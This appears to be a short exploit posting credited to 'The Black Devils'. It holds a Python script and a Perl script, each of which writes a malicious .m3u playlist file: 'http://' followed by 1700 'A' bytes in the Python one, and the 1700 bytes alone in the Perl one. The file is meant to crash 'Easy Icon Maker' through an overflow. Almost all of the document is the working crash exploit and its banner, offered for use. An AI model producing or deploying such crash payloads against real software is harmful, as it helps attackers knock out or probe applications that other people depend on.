# !/usr/bin/python
header="http://"
poc= "\x41" * 1700
file = open("asesino04.m3u","w")
file.write(header+poc)
file.close()
-------------------
#!/usr/bin/perl
system("title The Black Devils");
system("color 1e");
system("cls");
print "\n\n";               
print "    |=======================================================|\n";
print "    |= [!] Name : Easy Icon Maker Version                  =|\n";
print "    |= [!] Exploit : Crash  Exploit                        =|\n";
print "    |= [!] Author  : The Black Devils                      =|\n";
print "    |= [!] Mail: mr.k4rizma(at)gmail(dot)com               =|\n";
print "    |=======================================================|\n";
sleep(2);
print "\n";

# Creating ...
my $header="http://" ;
my $PoC = "\x41" x 1700 ; #
open(file , ">", "inj3ct0rs.m3u");
print file $PoC;
print "\n [+] File successfully created!\n" or die print "\n [-] OupsS! 
File is Not Created !! ";
close(file);
